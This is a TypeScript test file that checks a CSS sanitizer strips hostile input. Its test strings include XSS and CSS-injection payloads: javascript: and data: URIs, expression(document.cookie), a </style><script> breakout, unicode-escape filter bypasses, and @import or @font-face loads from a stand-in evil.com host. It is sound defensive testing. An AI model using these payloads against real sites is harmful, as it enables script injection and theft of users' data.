import { sanitizeCss } from '../lib/cssValidator';

describe('sanitizeCss', () => {
  it('passes through safe CSS unchanged', () => {
    const css = 'body { color: red; font-size: 14px; }';
    expect(sanitizeCss(css)).toBe(css);
  });

  it('returns empty string for null/undefined/non-string input', () => {
    expect(sanitizeCss(undefined)).toBe('');
    expect(sanitizeCss('')).toBe('');
    // @ts-expect-error — explicitly testing runtime type guard
    expect(sanitizeCss(123)).toBe('');
  });

  it('removes javascript: in url()', () => {
    const css = 'body { background: url("javascript:alert(1)"); }';
    expect(sanitizeCss(css)).not.toContain('javascript:');
  });

  it('removes expression()', () => {
    const css = 'div { width: expression(document.cookie); }';
    expect(sanitizeCss(css)).not.toContain('expression(');
  });

  it('removes @import', () => {
    const css = '@import url("https://evil.com/steal.css"); body { color: red; }';
    const result = sanitizeCss(css);
    expect(result).not.toContain('@import');
    expect(result).toContain('color: red');
  });

  it('removes data: URIs in url()', () => {
    const css = 'body { background: url("data:text/html,<script>alert(1)</script>"); }';
    expect(sanitizeCss(css)).not.toContain('data:');
  });

  // ── New coverage for LAUNCH-READINESS #9 bypass classes ──

  it('strips ALL url() calls, including https — customers must use config fields', () => {
    const css = 'body { background: url("https://example.com/bg.png") no-repeat; }';
    const result = sanitizeCss(css);
    expect(result).not.toMatch(/url\([^)]+\)/);
  });

  it('blocks @font-face external loads', () => {
    const css = '@font-face { font-family: x; src: url("https://evil.com/font.woff"); }';
    const result = sanitizeCss(css);
    expect(result).not.toContain('@font-face');
    expect(result).not.toContain('evil.com');
  });

  it('blocks @namespace and @charset', () => {
    expect(sanitizeCss('@charset "UTF-8"; body { color: red; }')).not.toContain('@charset');
    expect(sanitizeCss('@namespace svg url(http://x);')).not.toContain('@namespace');
  });

  it('strips position: fixed/sticky/absolute to prevent clickjacking overlays', () => {
    expect(sanitizeCss('div { position: fixed; top: 0; }')).not.toMatch(/position\s*:\s*fixed/i);
    expect(sanitizeCss('div { position: sticky; }')).not.toMatch(/position\s*:\s*sticky/i);
    expect(sanitizeCss('div { position: absolute; }')).not.toMatch(/position\s*:\s*absolute/i);
    // Position: relative is harmless and must survive.
    expect(sanitizeCss('div { position: relative; }')).toContain('position: relative');
  });

  it('strips -moz-binding and behavior: properties', () => {
    expect(sanitizeCss('div { -moz-binding: url(x.xml); }')).not.toContain('-moz-binding');
    expect(sanitizeCss('div { behavior: url(x.htc); }')).not.toContain('behavior:');
  });

  it('defeats unicode-escape bypass on url(', () => {
    // \75 = 'u', \72 = 'r', \6C = 'l' → constructs url(javascript:...) post-decode
    const css = 'div { background: \\75 \\72 \\6C(javascript:alert(1)); }';
    const result = sanitizeCss(css);
    expect(result).not.toMatch(/url\(/i);
    expect(result).not.toContain('javascript:');
  });

  it('defeats unicode-escape bypass on javascript:', () => {
    const css = 'div { background: url(\\6A avascript:alert(1)); }';
    const result = sanitizeCss(css);
    expect(result).not.toMatch(/javascript:/i);
  });

  it('strips angle brackets so the value cannot break out of <style>', () => {
    const css = 'div { color: red; } </style><script>alert(1)</script>';
    const result = sanitizeCss(css);
    expect(result).not.toContain('<');
    expect(result).not.toContain('>');
  });

  it('caps payload size to defend against memory-fill attacks', () => {
    const huge = 'a'.repeat(64 * 1024) + ' { color: red; }';
    const result = sanitizeCss(huge);
    expect(result.length).toBeLessThanOrEqual(16 * 1024);
  });
});
